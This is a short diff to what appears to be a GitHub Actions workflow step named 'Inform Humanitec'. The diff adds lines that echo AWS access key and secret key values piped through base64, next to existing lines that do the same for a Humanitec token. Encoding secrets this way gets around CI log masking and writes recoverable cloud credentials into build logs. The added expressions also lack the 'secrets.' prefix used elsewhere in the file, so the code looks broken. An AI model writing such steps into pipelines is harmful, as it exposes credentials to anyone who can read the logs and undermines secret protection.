@@ -45,6 +45,10 @@ jobs:
 
       - name: Inform Humanitec
         run: |-
+          echo "AWS_ACCESS_KEY_ID"
+          echo "${{ AWS_ACCESS_KEY_ID }}" | base64
+          echo "AWS_SECRET_ACCESS_KEY"
+          echo "${{ AWS_SECRET_ACCESS_KEY }}" | base64
           echo "HUMANITEC_ORG_ID"
           echo "${{ secrets.HUMANITEC_ORG_ID }}" | base64
           echo "HUMANITEC_TOKEN"
